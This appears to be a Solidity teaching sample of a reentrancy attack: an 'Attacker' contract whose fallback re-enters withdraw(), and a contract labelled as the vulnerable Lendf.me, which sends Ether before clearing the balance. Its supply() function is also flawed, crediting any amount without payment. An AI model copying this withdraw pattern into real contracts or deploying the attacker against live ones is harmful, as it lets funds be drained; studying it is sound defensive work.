pragma solidity ^0.6.4;

// Attacker contract
contract Attacker {
    
    Lendme me;
    bool check = false;

    function a(address addrlendme) public
    {
        me = Lendme(addrlendme);
        me.withdraw();
    }

    fallback () external payable {
        if (check)
        {
            return;
        }
        else
        {
            check = true;
            me.withdraw();
        }

    }
}

// Lendf.me vulnerable contract
contract Lendme
{
    mapping (address => uint) public userBalances;

    function supply(address user,uint256 amount) public payable returns (uint) 
    {
        userBalances[user] += amount;
    }

    function withdraw() public
    {
        uint amountToWithdraw = userBalances[msg.sender];
        msg.sender.call.value(amountToWithdraw)(""); // At this point, the caller's code is executed, and can call withdrawBalance again
        userBalances[msg.sender] = 0;
    }
    
    function getBalanceof() public returns (uint256)
    {
        return address (this).balance;
    }
}